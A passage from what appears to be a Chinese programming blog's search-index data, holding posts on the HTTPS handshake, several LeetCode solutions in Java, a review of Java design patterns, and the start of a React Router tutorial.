协议中浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞。HTTP/2在 应用层(HTTP/2)和传输层(TCP or UDP)之间增加一个二进制分帧层。在不改动 HTTP/1.x 的语义、方法、状态码、URI 以及首部字段的情况下, 解决了HTTP1.1 的性能限制，改进传输性能，实现低延迟和高吞吐量。 HTTPS 基本流程 客户端发送一个 ClientHello 消息到服务器端，消息中同时包含了它的 Transport Layer Security (TLS) 版本，可用的加密算法和压缩算法。 服务器端向客户端返回一个 ServerHello 消息，消息中包含了服务器端的 TLS 版本，服务器所选择的加密和压缩算法，以及数字证书认证机构（Certificate Authority，缩写 CA）签发的服务器公开证书，证书中包含了公钥。客户端会使用这个公钥加密接下来的握手过程，直到协商生成一个新的对称密钥。证书中还包含了该证书所应用的域名范围（Common Name，简称 CN），用于客户端验证身份。 客户端根据自己的信任 CA 列表，验证服务器端的证书是否可信。如果认为可信（具体的验证过程在下一节讲解），客户端会生成一串伪随机数，使用服务器的公钥加密它。这串随机数会被用于生成新的对称密钥 服务器端使用自己的私钥解密上面提到的随机数，然后使用这串随机数生成自己的对称主密钥 客户端发送一个 Finished 消息给服务器端，使用对称密钥加密这次通讯的一个散列值 服务器端生成自己的 hash 值，然后解密客户端发送来的信息，检查这两个值是否对应。如果对应，就向客户端发送一个 Finished 消息，也使用协商好的对称密钥加密 从现在开始，接下来整个 TLS 会话都使用对称秘钥进行加密，传输应用层（HTTP）内容 Socket socket() 创建套接字 bind() 分配套接字地址 listen() 等待连接请求 accept() 允许连接请求 read()/write() 数据交换 close() 关闭连接","categories":[{"name":"面试","slug":"面试","permalink":"https://virgilchen97.github.io/categories/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"排序","slug":"排序","permalink":"https://virgilchen97.github.io/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"287. 寻找重复数","slug":"287-寻找重复数","date":"2020-07-26T14:27:21.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/07/287-寻找重复数/","link":"","permalink":"https://virgilchen97.github.io/2020/07/287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/","excerpt":"","text":"给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。 12345输入: [1,3,4,2,2]输出: 2输入: [3,1,3,4,2]输出: 3 说明： 不能更改原数组（假设数组是只读的）。 只能使用额外的 O(1) 的空间。 时间复杂度小于 O(n^2) 。 数组中只有一个重复的数字，但它可能不止重复出现一次。 解法 首先不考虑题目中 O(1) 的要求，第一个想到的肯定是用一个 Set。包括上 O(1) 的要求，那我们想到的会是将原本的数组当作 Set 来使用，出现过的数就将这个数对应的数组位置中的数变为负数，例如： 1[1,3,4,2,2] 遍历数组，首先到 1，因为数组中的数是 1 ~ n 而下标是 0 ~ n - 1，因此我们把位置在 0 的数变为负数： 1[-1,3,4,2,2] 同理，以此往复： 1234[-1,3,-4,2,2] 遇到 3，把 位置 2 的数变为负数[-1,3,-4,-2,2] 遇到 4，把 位置 3 的数变为负数[-1,-3,-4,-2,2] 遇到 2，把 位置 1 的数变为负数[-1,-3,-4,-2,2] 遇到 2，把 位置 1 的数已经是负数，所以 2 是重复的 但是本题中又限制了不可以对原数组进行修改，因此我们将数组看作一个链表，如果数组中的元素有重复，那么这个链表中必定存在环。举个例子，还是数组，开始时我们位于位置 0： 123456[(1),3,4,2,2][1,(3),4,2,2] 位置 0 的数是 1， 跳到位置 1[1,3,4,(2),2] 位置 1 的数是 3， 跳到位置 3[1,3,(4),2,2] 位置 3 的数是 2， 跳到位置 2[1,3,4,2,(2)] 位置 2 的数是 4， 跳到位置 4[1,3,(4),2,2] 位置 4 的数是 2， 跳到位置 2 回到了之前的位置 因此这个问题就等价转换成了寻找一个含有环的链表的环入口的问题。判断一个链表是否有环十分简单，我们只需要使用快慢指针即可，而寻找环的入口我们需要一个小小的证明： 如图所示，环的入口点是 A，快慢指针相交的节点是 B，从链表头到入环节点 A 的长度是 a，A 顺时针 到 B 的距离是 b，B 顺时针到 A 的距离是 c。那么慢指针走过的距离就是 a+b，而快指针绕了一圈走过的距离是 a+b+c+b。而我们知道快指针走过的距离是慢指针的两倍。因此 2*(a+b) = a + b + c + b，也就是 a = c。 因此我们只需要在链表头添加一个新指针，和慢指针一同一次前进一个节点，两者相遇的点就是环入口。 12345678910111213141516class Solution &#123; public int findDuplicate(int[] nums) &#123; int slow = 0; int fast = 0; while(slow != fast || fast == 0)&#123; slow = nums[slow]; fast = nums[nums[fast]]; &#125; // i 是新的从链表头开始的指针 for(int i = 0; i != slow; i = nums[i])&#123; slow = nums[slow]; &#125; return slow; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"链表","slug":"链表","permalink":"https://virgilchen97.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"525-连续数组","slug":"525-连续数组","date":"2020-07-20T14:45:43.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/07/525-连续数组/","link":"","permalink":"https://virgilchen97.github.io/2020/07/525-%E8%BF%9E%E7%BB%AD%E6%95%B0%E7%BB%84/","excerpt":"给定一个二进制数组, 找到含有相同数量的 0 和 1 的最长连续子数组（的长度）。 示例 1: 123输入: [0,1]输出: 2说明: [0, 1] 是具有相同数量0和1的最长连续子数组。","text":"给定一个二进制数组, 找到含有相同数量的 0 和 1 的最长连续子数组（的长度）。 示例 1: 123输入: [0,1]输出: 2说明: [0, 1] 是具有相同数量0和1的最长连续子数组。 解法 暴力（超时） 首先求出所有 0 和 1 的前缀和，然后遍历所有可能，求出 0 和 1 相等的最长连续子数组： 123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public int findMaxLength(int[] nums) &#123; // 求出前缀和 int[][] count = new int[nums.length][2]; int countzero = 0; int countone = 0; for (int i = 0; i &lt; nums.length; i++) &#123; if (nums[i] == 0) &#123; countzero++; &#125; else &#123; countone++; &#125; count[i][0] = countzero; count[i][1] = countone; &#125; // 暴力找出最长数组 int max = 0; for (int i = 0; i &lt; nums.length; i++) &#123; for (int j = i + 1; j &lt; nums.length; j++) &#123; if (i &gt; 0) &#123; if (count[j][0] - count[i-1][0] == count[j][1] - count[i-1][1]) &#123; max = Math.max(max, j - i + 1); &#125; &#125;else &#123; if(count[j][0] == count[j][1])&#123; max = Math.max(max, j + 1); &#125; &#125; &#125; &#125; return max; &#125;&#125; 将 0 变为 -1 我们将数组中的 0 全部变为 -1，再次求数组的前缀和，那么前缀和相等的两个点之间 0 和 1 的数目便是相等的，因为 +1 和 -1 的数量相同才会使得前缀和不变。 因此我们再求前缀和的过程中，若当前前缀和已经出现，则可以立刻找出从何处到当前位置的0，1数量相等，最后取max就看了一获得结果。 1234567891011121314151617181920212223242526272829class Solution &#123; public int findMaxLength(int[] nums) &#123; // 把 0 变成 -1 for (int i = 0; i &lt; nums.length; i++) &#123; if(nums[i] == 0)&#123; nums[i] = -1; &#125; &#125; int max = 0; int sum = 0; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); // 处理 sum = 0 的特殊情况 map.put(0, -1); for (int i = 0; i &lt; nums.length; i++) &#123; sum += nums[i]; if(map.containsKey(sum))&#123; max = Math.max(max, i - map.get(sum)); &#125; else&#123; map.put(sum, i); &#125; &#125; return max; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"875-爱吃香蕉的珂珂","slug":"875-爱吃香蕉的珂珂","date":"2020-07-17T08:43:00.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/07/875-爱吃香蕉的珂珂/","link":"","permalink":"https://virgilchen97.github.io/2020/07/875-%E7%88%B1%E5%90%83%E9%A6%99%E8%95%89%E7%9A%84%E7%8F%82%E7%8F%82/","excerpt":"题目 珂珂喜欢吃香蕉。这里有 N 堆香蕉，第 i 堆中有 piles[i] 根香蕉。警卫已经离开了，将在 H 小时后回来。 珂珂可以决定她吃香蕉的速度 K （单位：根/小时）。每个小时，她将会选择一堆香蕉，从中吃掉 K 根。如果这堆香蕉少于 K 根，她将吃掉这堆的所有香蕉，然后这一小时内不会再吃更多的香蕉。 珂珂喜欢慢慢吃，但仍然想在警卫回来前吃掉所有的香蕉。 返回她可以在 H 小时内吃掉所有香蕉的最小速度 K（K 为整数）。","text":"题目 珂珂喜欢吃香蕉。这里有 N 堆香蕉，第 i 堆中有 piles[i] 根香蕉。警卫已经离开了，将在 H 小时后回来。 珂珂可以决定她吃香蕉的速度 K （单位：根/小时）。每个小时，她将会选择一堆香蕉，从中吃掉 K 根。如果这堆香蕉少于 K 根，她将吃掉这堆的所有香蕉，然后这一小时内不会再吃更多的香蕉。 珂珂喜欢慢慢吃，但仍然想在警卫回来前吃掉所有的香蕉。 返回她可以在 H 小时内吃掉所有香蕉的最小速度 K（K 为整数）。 解法 二分查找 我们可以使用二分查找的方式来查找珂珂吃香蕉的速度，我们可以知道的是珂珂吃香蕉速度的下界是 1 （0 的话珂珂还爱吃香蕉吗），上界则是 max(piles)（超过了也不会加快吃香蕉的速度了）。因此我们可以写出对应的二分查找算法： 12345678910111213141516171819202122232425262728293031323334353637class Solution &#123; public int minEatingSpeed(int[] piles, int H) &#123; // 先找到 Max int max = Integer.MIN_VALUE; for(int pile:piles)&#123; if(pile &gt; max)&#123; max = pile; &#125; &#125; // 下界是 1，上界是max int l = 1; int r = max; while(l &lt; r)&#123; // 防止溢出 int m = l + (r-l) / 2; // 计算吃完的时间 int totalTime = 0; for(int pile:piles)&#123; // 变相取整，避免类型转换和计算浮点数 // totalTime += (int)Math.ceil((double)pile / m); totalTime += (pile - 1) / m + 1; &#125; if(totalTime &lt;= H)&#123; // 如果时间小，当前的速度是不是正好我们不知道，所以还要考虑 // 因此不是 r = m - 1; r = m; &#125;else&#123; // 如果时间大，那么当前速度一定不可行 l = m + 1; &#125; &#125; return l; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二分查找","slug":"二分查找","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"设计模式复习","slug":"设计模式复习","date":"2020-06-30T15:14:23.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/设计模式复习/","link":"","permalink":"https://virgilchen97.github.io/2020/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0/","excerpt":"","text":"创建型模式 工厂模式 定义一个用于创建对象的接口，让子类决定实例化哪一个类。 Factory Method使一个类的实例化延迟到其子类。当客户端需要一个对象的实例时，会去向工厂获取而不是自己创建。通常我们会将工厂和其产品都定义为接口，客户端都调用接口方法。例如我们有对象 Car 和其对应的 CarFactory: 12345678// 工厂接口public interface CarFactory &#123; Car getCar(String s);&#125;// Car 接口public interface Car &#123; void run();&#125; 而实现我们可以这么编写 1234567891011public SuperCarFactory implements CarFactory throws CarDoesNotExistException&#123; public Car getCar(String s)&#123; if(s.equals(&quot;Porsche&quot;))&#123; return new Porsche(); &#125;else if(s.equals(&quot;Ferrari&quot;))&#123; return new Ferrari(); &#125;else&#123; throw new CarDoesNotExistException(); &#125; &#125;&#125; 在这里我就省略 Porsche 和 Ferrari 的具体实现了。客户端现在就可以通过调用 getCar 方法来获取想要的 Car。而这个 Car 具体是什么类型，是如何创造的，客户端完全无需担心。 抽象工厂模式 提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。 抽象工厂模式相当于工厂模式的进一步抽象，在工厂模式中我们定义了 CarFactory 接口，而我们可能会有很多个工厂的实现类，例如 SuperCarFactory, RaceCarFactory 等。我们进一步的把这些工厂抽象为一个 AbstractFactory： 1234567891011public interface AbstractCarFactory &#123; public static AbstractFactory createFactory(String name)&#123; if (name.equalsIgnoreCase(&quot;super-car&quot;)) &#123; return new SuperCarFactory(); &#125; else if (name.equalsIgnoreCase(&quot;race-car&quot;)) &#123; return new RaceCarFactory(); &#125; else &#123; throw new CarFactoryDoesNotExistException(); &#125; &#125;&#125; 这样我们甚至无需关心工厂的类型，只需要关心创建出的产品。 单例模式 保证一个类仅有一个实例，并提供一个访问它的全局访问点。 单例模式是为了保证某个对象始终只有一个实例。实现单例模式很简单： 构造方法为 private，确保外部无法实例化 通过 private static 变量持有唯一实例，保证全局唯一性 通过 public static 方法返回此唯一实例，使外部调用方能获取到实例 1234567891011public class Singleton &#123; // 唯一实例的引用 private static Singleton INSTANCE = new Singleton(); // private构造方法保证外部无法实例化: private Singleton() &#123;&#125; public static Singleton getInstance()&#123; return INSTANCE; &#125;&#125; 此外单例模式还有延迟加载的方式，即只有在第一次调用 getInstance() 时才会初始化单例的实例： 123456789101112public class Singleton &#123; private static Singleton INSTANCE = null; private Singleton() &#123;&#125; public static Singleton getInstance() &#123; if (INSTANCE == null) &#123; INSTANCE = new Singleton(); &#125; return INSTANCE; &#125;&#125; 然而在多线程环境下这种写法显然是错误的，解决方法一种是可以在 getInstance() 方法添加 synchronize 修饰，但是这会严重影响并发性能。因此我们有了双重检查机制： 12345678910111213141516public class Singleton &#123; private static volatile Singleton INSTANCE = null; private Singleton() &#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; synchronized (Singleton.class) &#123; if (instance == null) &#123; instance = new Singleton(); &#125; &#125; &#125; return instance; &#125;&#125; 这样的话只有在对象未创建时才会发生竞争。注意 INSTANCE 参数前添加的 volatile 修饰符。由于Java内存模型的原因，创建对象并不是一个原子操作。线程 A 执行到 instance = new Singleton(); 时，instance 不为 null 了，但是对象的初始化可能尚未完成，线程 B 可能获取到一个尚未完全初始化的对象。而 volatile 关键字禁用了指令重排序并且强制任何工作内存空间的修改立即更新到主内存空间，便雄安除了这种问题。具体解释可以看另一篇 博客 建造者模式 将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。 当我们使用Builder的时候，一般来说，是因为创建这个对象的步骤比较多，每个步骤都需要一个零部件，最终组合成一个完整的对象。 假设我们在创建一个 Car 对象时，可能有非常多的子组件，例如 Engine, Tire, Transmission 等等。而这些子对象可能也由更多子对象构成。如果我们创建Car对象的过程还需要一个个创建这些对象就十分麻烦，因此我们就有了建造者模式。我们可以写一个 CarBuilder: 1234567891011public class CarBuilder&#123; private EngineBuilder engineBuilder = new EngineBuilder(); private TireBuilder tireBuilder = new TireBuilder(); public Car build()&#123; Car car = new Car(); car.setEngine(engineBuilder.build()); car.setTire(tireBuilder.build()); return car; &#125;&#125; 这样层层委托，便可以构造出一个对象，而客户端无需关心构建对象的细节。 结构型模式 适配器模式 将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。 适配器模式就是如果我们已经有了一个类 A 的某种实现，现在我们有了一种新的接口 B，我们希望让类 A 也可以适应这种接口 B。直接修改类 A 会使得原本使用类 A 的所有代码都变得不可用，因此我们可以定义一种适配器，将对于接口 B 的调用转换为对类 A 的调用。例如现在我们有一个 Task 类实现了 Callable 接口： 123456789101112131415public class Task implements Callable&lt;Long&gt; &#123; private long num; public Task(long num) &#123; this.num = num; &#125; public Long call() throws Exception &#123; long r = 0; for (long n = 1; n &lt;= this.num; n++) &#123; r = r + n; &#125; System.out.println(&quot;Result: &quot; + r); return r; &#125;&#125; 而如果我们想把他放在一个线程中执行，程序会报错，因为 Java 的 Thread 只接受 Runnable 接口的对象，因此我们可以编写一个适配器： 123456789101112131415161718public class RunnableAdapter implements Runnable &#123; // 引用待转换接口: private Callable&lt;?&gt; callable; public RunnableAdapter(Callable&lt;?&gt; callable) &#123; this.callable = callable; &#125; // 实现指定接口: public void run() &#123; // 将指定接口调用委托给转换接口调用: try &#123; callable.call(); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 通过这一适配器我们就把 Task 适配为了 Runnable。 过滤器模式 组合模式 将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性。 这种模式非常适用于树状接口，把叶子节点和根节点统一管理。例如我们常见的 HTML，一个父节点会包含多个子节点，而子节点一会包含更多的子节点，因此我们可以用同一种接口来抽象父节点与子节点： 12345678public interface Node &#123; // 添加一个节点为子节点: Node add(Node node); // 获取子节点: List&lt;Node&gt; children(); // 输出为HTML: String toHtml();&#125; 装饰器模式 动态地给一个对象添加一些额外的职责。就增加功能来说，相比生成子类更为灵活。 使用装饰器模式，我们可以在运行期间给对象实例增加新的功能。如果不使用装饰器模式，每一种功能都需要对应的子类，那样的话子类的数量过多。而使用装饰器模式就可以缓解这些问题。 例如 Java 中的 InputStream，本身不带有附加功能，而我们可以通过使用 BufferedInputStream, GZIPInputStream 这样的装饰器来 InputStream 添加功能： 1234InputStream input = new GZIPInputStream( // 第二层装饰 new BufferedInputStream( // 第一层装饰 new FileInputStream(&quot;test.gz&quot;) // 核心功能 )); 外观模式 为子系统中的一组接口提供一个一致的界面。Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。 原本客户端可能要与系统内的多个子系统打交道，这样客户端就需要了解系统的各个接口，十分麻烦。如果有这样一个中介可以替客户端完成对于这些接口的访问，那么客户端使用起来则较为方便。例如如果我们想要组装一个 HTTP POST 请求，我们需要组装 Header 和 Body： 1234567891011public class Header&#123; public Header getHeader()&#123; &#125;&#125;public class Body&#123; public Header getBody()&#123; &#125;&#125; 假设我们的客户端很懒连这些都不想做，那我们可以提供这样一种中介： 123456789public class HttpRequestFacade&#123; Header header = new Header(); Body body = new Body(); public HttpRequest getRequest()&#123; requestHeader = header.getHeader(); requestBody = body.getBody(); return new HttpRequest(requestHeader, requestBody); &#125;&#125; 这样客户端就不再需要去和具体的模块打交道。 代理模式 为其他对象提供一种代理以控制对这个对象的访问。 代理模式和Adaptor模式类似，都是在原有的接口上包装一层。但不同的是适配器模式是为了把 A 接口转换为 B 接口。而代理模式的输出仍然是 A 接口，但是我们在调用过程中添加了新的功能。例如现在我们有一个业务逻辑的类GoogleUserController，用来处理谷歌账号的登录，他的定义如下： 12345678public class GoogleUserController implements UserController&#123; public boolean login(String username, String password)&#123; ... &#125; public void logout(String username)&#123; ... &#125;&#125; 现在我们希望在用户登录或者是登出时，在控制台输出日志，那么我们可以创建一个代理类： 12345678910111213141516public class GoogleUserControllerProxy implements UserController&#123; GoogleUserController controller; public GoogleUserControllerProxy(GoogleUserController controller)&#123; this.controller = controller; &#125; public boolean login(String username, String password)&#123; System.out.println(&quot;User &#123;&quot; + username + &quot;&#125; try to log in&quot;); controller.login(); &#125; public void logout(String username)&#123; System.out.println(&quot;User &#123;&quot; + username + &quot;&#125; try to log out&quot;); controller.logout(); &#125;&#125; 以后我们只要给客户端提供 GoogleUserControllerProxy，那么所有的登录就自动加上了日志，而客户端甚至不知道我们对这个类进行了修改。实际上 Spring 中的 AOP 就是基于代理模式 行为型模式 责任链模式 使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。 定义中表述的十分明确，责任链模式把多个处理器串成链，然后让请求在链上传递，直到链中有一个对象处理了该请求。在我们的生活中有很多这样的例子，例如运营商的营业厅，市分公司，省分公司，总公司等。一个营业厅如果想要申请一笔资金，就要向市分公司汇报，市公司处理不了就要交给省公司，逐级往上，直到事务请求处理了为止。首先我们要定义一个事务： 12345public class request&#123; private String name; private String amount; // 构造器，getter，setter 省略&#125; 然后我们要把事务处理统一成接口： 123456public interface Handler &#123; // 返回Boolean.TRUE = 成功 // 返回Boolean.FALSE = 拒绝 // 返回null = 交下一个处理 Boolean process(Request request);&#125; 然后我们就可以编写各个公司，以是公司为例： 12345678910public class CityLevelCompany implements Handler &#123; public Boolean process(Request request) &#123; // 如果超过1000元，处理不了，交下一个处理: if (request.getAmount() &gt; 1000) &#123; return null; &#125;else&#123; // 内部判断审批是否通过的逻辑 &#125; &#125;&#125; 然后我们就需要构造一个责任链的原型，使得这些 Handler 可以被连接起来： 1234567891011121314151617181920public class HandlerChain &#123; // 持有所有Handler: private List&lt;Handler&gt; handlers = new ArrayList&lt;&gt;(); public void addHandler(Handler handler) &#123; this.handlers.add(handler); &#125; public boolean process(Request request) &#123; // 依次调用每个Handler: for (Handler handler : handlers) &#123; Boolean r = handler.process(request); if (r != null) &#123; // 如果返回TRUE或FALSE，处理结束: return r; &#125; &#125; throw new RuntimeException(&quot;Could not handle request: &quot; + request); &#125;&#125; 然后我们就可以构造我们的责任链并处理请求了： 123456HandlerChain chain = new HandlerChain();chain.addHandler(new ManagerHandler());chain.addHandler(new DirectorHandler());chain.addHandler(new CEOHandler());// 处理请求chain.process(new Request(&quot;Bob&quot;, 10000)); 在 J2EE 中，Servlet规范规定的过滤器就是一种责任链模式，不同的是责任链中的每一个 Filter 都有处理请求的机会，前部的 Filter 可以向 request 和 response 中添加元素，也可以决定是否放行。","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://virgilchen97.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"49-字母异位词分组","slug":"49-字母异位词分组","date":"2020-06-27T14:48:20.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/49-字母异位词分组/","link":"","permalink":"https://virgilchen97.github.io/2020/06/49-%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84/","excerpt":"给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。 示例: 1234567输入: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;]输出:[ [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;], [&quot;nat&quot;,&quot;tan&quot;], [&quot;bat&quot;]] 说明： 所有输入均为小写字母。 不考虑答案输出的顺序。","text":"给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。 示例: 1234567输入: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;]输出:[ [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;], [&quot;nat&quot;,&quot;tan&quot;], [&quot;bat&quot;]] 说明： 所有输入均为小写字母。 不考虑答案输出的顺序。 方法1：哈希 我们可以找到一种哈希的方法，使得不同的字母异位词的哈希结果始终相同，而非字母异位词的编码结果不同。这样我们就可以通过这一段编码来给字母异位词分类。 乍一听这种方法很难理解，实际上很简单。区分字母异位词的显著特征就是不同字母出现的数量。因此我们可以做如下的操作： 遍历一遍这个单词，统计每个字母出现的频率。 通过 &#123;字母1&#125;&#123;出现次数&#125;&#123;字母2&#125;&#123;出现次数&#125;... 的方法编码产生一个字符串 这样的话所有字母异位词的编码结果始终相同。 1234567891011121314151617181920212223242526272829class Solution &#123; public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; Map&lt;String, List&lt;String&gt;&gt; map = new HashMap&lt;&gt;(); for(String str:strs)&#123; // 统计字幕出现频率 int[] arr = new int[26]; for(char a:str.toCharArray())&#123; arr[a - &#x27;a&#x27;]++; &#125; // 编码当前单词 StringBuilder sb = new StringBuilder(); for(int i = 0; i &lt; 26; i++)&#123; sb.append(arr[i]).append((char)(i+&#x27;a&#x27;)); &#125; // 根据编码将字母异位词归类 String key = sb.toString(); if(map.containsKey(key))&#123; map.get(key).add(str); &#125;else&#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(str); map.put(key, list); &#125; &#125; return new ArrayList&lt;&gt;(map.values()); &#125;&#125; 方法2：哈希2 我们的目标依然是找到一种哈希的方法，使得不同的字母异位词的哈希结果始终相同。这次我们使用质数的乘积来实现。 我们用前26个质数分别表示26个字母，而一个单词则反应成他们所代表的质数的乘积。若两个单词是字母异位词，那么他们乘积的结果一定相同，如果不是，那么他们的乘积一定不同： 1234567891011121314151617181920212223class Solution &#123; public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; HashMap&lt;Integer, List&lt;String&gt;&gt; hash = new HashMap&lt;&gt;(); //每个字母对应一个质数 int[] prime = &#123; 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103 &#125;; for (int i = 0; i &lt; strs.length; i++) &#123; int key = 1; //累乘得到 key for (int j = 0; j &lt; strs[i].length(); j++) &#123; key *= prime[strs[i].charAt(j) - &#x27;a&#x27;]; &#125; if (hash.containsKey(key)) &#123; hash.get(key).add(strs[i]); &#125; else &#123; List&lt;String&gt; temp = new ArrayList&lt;String&gt;(); temp.add(strs[i]); hash.put(key, temp); &#125; &#125; return new ArrayList&lt;List&lt;String&gt;&gt;(hash.values()); &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[]},{"title":"React Router 学习","slug":"React-Router-学习","date":"2020-06-26T08:03:51.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/React-Router-学习/","link":"","permalink":"https://virgilchen97.github.io/2020/06/React-Router-%E5%AD%A6%E4%B9%A0/","excerpt":"简介 引用中文文档中的介绍： React Router 是一个基于React 之上的强大路由库，它可以让你向应用中快速地添加视图和数据流，同时保持页面与URL 间的同步。 也就是说使用了 React router，我们就可以通过URL来实现组件的展示与跳转。安装 React router 很简单，只需要： 1npm install react-router-dom --save","text":"简介 引用中文文档中的介绍： React Router 是一个基于React 之上的强大路由库，它可以让你向应用中快速地添加视图和数据流，同时保持页面与URL 间的同步。 也就是说使用了 React router，我们就可以通过URL来实现组件的展示与跳转。安装 React router 很简单，只需要： 1npm install react-router-dom --save 快速上手 基本使用 首先我们使用 create-react-app 快速创建一个React单页应用，在你想要创建项目的目录执行： 1npx create-react-app &lt;项目名称&gt; 首先创建一个 component 文件夹，在文件夹内创建 AppRouter.js，首先我们引入所有需要的包： 1234567import React from &#x27;react&#x27;import &#123; BrowserRouter as Router, Switch, Route, Link&#125; from &#x27;react-router-dom&#x27; 然后编写 AppRouter 组件本体： 1234567891011121314151617181920212223242526272829303132const AppRouter = () =&gt; &#123; return ( &lt;Router&gt; &lt;div&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to=&quot;/&quot;&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=&quot;/about&quot;&gt;About&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=&quot;/Users&quot;&gt;Users&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;Switch&gt; &lt;Route path=&quot;/about&quot;&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=&quot;/Users&quot;&gt; &lt;Users /&gt; &lt;/Route&gt; &lt;Route path=&quot;/&quot;&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/Router&gt; )&#125; 最后创建 Home，About，User 这三个组件： 1234567891011const About = () =&gt; &#123; return &lt;h2&gt;About&lt;/h2&gt;&#125;const Home = () =&gt; &#123; return &lt;h2&gt;Home&lt;/h2&gt;&#125;const Users = () =&gt; &#123; return &lt;h2&gt;Users&lt;/h2&gt;&#125; 最后别忘了： 1export default AppRouter 然后修改 App.js 删除除了import以外所有默认内容，在主页展示我们写好的 AppRouter组件： 1234567function App() &#123; return ( &lt;AppRouter /&gt; );&#125;export default App; 现在执行 npm start，观察运行效果。发现点击链接时浏览器的 URL 栏也会一起改变，但是实际上我们并没有加载任何新的 HTML 页面，这还是一个单页应用。 Nested Routing 上一个例子展示了一个简单的路由，同样的我们也可以实现多级路由。对 AppRouter.js 进行修改，首先添加几个应用： 123456789import React from &quot;react&quot;;import &#123; BrowserRouter as Router, Switch, Route, Link, useRouteMatch, useParams&#125; from &quot;react-router-dom&quot;; 接着修改 AppRouter.js 下的 User： 12345678910111213141516171819202122232425262728const Users = () =&gt; &#123; // 通过 Hook 获取 match let match = useRouteMatch() let users = [&#x27;Alice&#x27;, &#x27;Bob&#x27;,&#x27;Jimmy&#x27;] console.log(match) return ( &lt;div&gt; &lt;h2&gt;Users&lt;/h2&gt; &lt;ul&gt; &#123;/*在User上循环输出链接*/&#125; &#123;users.map(user =&gt; &#123; return ( &lt;li key=&#123;user&#125; &gt; &lt;Link to=&#123;`$&#123;match.url&#125;/$&#123;user&#125;`&#125;&gt;&#123;user&#125;&lt;/Link&gt; &lt;/li&gt; )&#125;)&#125; &lt;/ul&gt; &lt;Switch&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/:userId`&#125;&gt; &lt;User /&gt; &lt;/Route&gt; &lt;Route path=&#123;`$&#123;match.path&#125;`&#125;&gt; &lt;h3&gt;Please select a user&lt;/h3&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/div&gt; )&#125; 然后添加一个新的User组件： 12345const User = () =&gt; &#123; // 通过 Hook 获取 路径变量 let &#123; userId &#125; = useParams(); return &lt;h3&gt;User name: &#123;userId&#125;&lt;/h3&gt;&#125; 重新运行项目，选择不同的 user，浏览器路径也会跟随变化： 开始 URL 参数 在刚才的例子中我们已经接触到了 URL 参数，在 Users 组件中，&lt;Route&gt; 标签内的 path 